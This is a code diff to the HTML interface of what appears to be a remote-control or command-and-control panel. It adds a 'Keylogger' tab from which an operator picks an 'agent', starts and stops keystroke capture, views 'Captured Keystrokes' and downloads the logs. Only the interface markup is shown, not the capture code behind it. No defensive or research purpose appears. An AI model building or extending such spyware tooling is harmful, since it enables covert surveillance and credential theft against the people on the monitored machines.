@@ -26,6 +26,10 @@
                 <span class="material-icons">folder</span>
                 Storage
             </button>
+            <button class="tab-button" data-tab="keylogger">
+                <span class="material-icons">keyboard</span>
+                Keylogger
+            </button>
         </nav>
 
         <!-- Tab Content -->
@@ -65,6 +69,50 @@
                 <div class="storage-panel">
                     <h2>File Storage</h2>
                     <div class="storage-content"></div>
+                </div>
+            </div>
+
+            <!-- Keylogger Tab -->
+            <div id="keylogger" class="tab-pane">
+                <div class="keylogger-container">
+                    <div class="keylogger-header">
+                        <h2>Keylogger Control Panel</h2>
+                        <div class="keylogger-actions">
+                            <button onclick="startKeylogger()" class="action-button start">
+                                <span class="material-icons">play_arrow</span>
+                                Start
+                            </button>
+                            <button onclick="stopKeylogger()" class="action-button stop">
+                                <span class="material-icons">stop</span>
+                                Stop
+                            </button>
+                            <button onclick="downloadLogs()" class="action-button download">
+                                <span class="material-icons">download</span>
+                                Download Logs
+                            </button>
+                            <button onclick="clearLogs()" class="action-button clear">
+                                <span class="material-icons">clear_all</span>
+                                Clear Logs
+                            </button>
+                        </div>
+                    </div>
+                    <div class="keylogger-content">
+                        <div class="agent-selection">
+                            <select id="keylogger-agent-select">
+                                <option value="">Select an agent...</option>
+                            </select>
+                        </div>
+                        <div class="logs-container">
+                            <div class="logs-header">
+                                <span>Captured Keystrokes</span>
+                                <div class="logs-status">
+                                    <span class="status-indicator"></span>
+                                    <span class="status-text">Stopped</span>
+                                </div>
+                            </div>
+                            <div id="keylogger-output" class="logs-output"></div>
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
